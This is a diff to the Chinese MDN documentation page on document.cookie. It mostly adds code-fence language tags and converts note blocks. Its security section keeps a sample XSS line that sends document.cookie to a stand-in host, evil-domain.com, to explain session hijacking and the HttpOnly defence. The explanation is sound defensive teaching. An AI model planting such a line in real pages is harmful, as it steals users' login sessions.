@@ -11,7 +11,7 @@ slug: Web/API/Document/cookie
 
 ##### 读取所有可从此位置访问的 Cookie
 
-```
+```js
 allCookies = document.cookie;
 ```
 
@@ -19,7 +19,7 @@ allCookies = document.cookie;
 
 ##### 写一个新 cookie
 
-```
+```js
 document.cookie = newCookie;
 ```
 
@@ -38,7 +38,8 @@ document.cookie = newCookie;
 
 - cookie 的值字符串可以用[encodeURIComponent()](/zh-CN/docs/JavaScript/Reference/Global_Objects/encodeURIComponent)来保证它不包含任何逗号、分号或空格 (cookie 值中禁止使用这些值).
 
-> **备注：** 在 Gecko 6.0 前，被引号括起的路径的引号会被当做路径的一部分，而不是被当做定界符。现在已被修复。
+> [!NOTE]
+> 在 Gecko 6.0 前，被引号括起的路径的引号会被当做路径的一部分，而不是被当做定界符。现在已被修复。
 
 ## 示例
 
@@ -180,13 +181,14 @@ var docCookies = {
 };
 ```
 
-> **备注：** 对于永久 cookie 我们用了`Fri, 31 Dec 9999 23:59:59 GMT`作为过期日。如果你不想使用这个日期，可使用*[世界末日](http://en.wikipedia.org/wiki/Year_2038_problem)*`Tue, 19 Jan 2038 03:14:07 GMT，`它是 32 位带符号整数能表示从 1 January 1970 00:00:00 UTC 开始的最大秒长 (即`01111111111111111111111111111111`, 是 `new Date(0x7fffffff * 1e3)`).
+> [!NOTE]
+> 对于永久 cookie 我们用了`Fri, 31 Dec 9999 23:59:59 GMT`作为过期日。如果你不想使用这个日期，可使用*[世界末日](http://en.wikipedia.org/wiki/Year_2038_problem)*`Tue, 19 Jan 2038 03:14:07 GMT，`它是 32 位带符号整数能表示从 1 January 1970 00:00:00 UTC 开始的最大秒长 (即`01111111111111111111111111111111`, 是 `new Date(0x7fffffff * 1e3)`).
 
 ### 写入 cookie
 
 ##### 语法
 
-```
+```js-nolint
 docCookies.setItem(name, value[, end[, path[, domain[, secure]]]])
 ```
 
@@ -213,7 +215,7 @@ docCookies.setItem(name, value[, end[, path[, domain[, secure]]]])
 
 ##### 语法
 
-```
+```js-nolint
 docCookies.getItem(name)
 ```
 
@@ -230,7 +232,7 @@ docCookies.getItem(name)
 
 ##### Syntax
 
-```
+```js-nolint
 docCookies.removeItem(name[, path],domain)
 ```
 
@@ -251,7 +253,7 @@ docCookies.removeItem(name[, path],domain)
 
 ##### 语法
 
-```
+```js-nolint
 docCookies.hasItem(name)
 ```
 
@@ -268,7 +270,7 @@ docCookies.hasItem(name)
 
 ##### 语法
 
-```
+```js-nolint
 docCookies.keys()
 ```
 
@@ -318,8 +320,9 @@ alert(docCookies.getItem("test1;="));
 
 Web 应用程序通常使用 cookies 来标识用户身份及他们的登录会话。因此通过窃听这些 cookie，就可以劫持已登录用户的会话。窃听的 cookie 的常见方法包括社会工程和 XSS 攻击 -
 
-```
-(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
+```js
+new Image().src =
+  "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
 ```
 
 `HttpOnly` 属性可以阻止通过 javascript 访问 cookie，从而一定程度上遏制这类攻击。参见 [Cookies and Security](http://www.nczonline.net/blog/2009/05/12/cookies-and-security/).
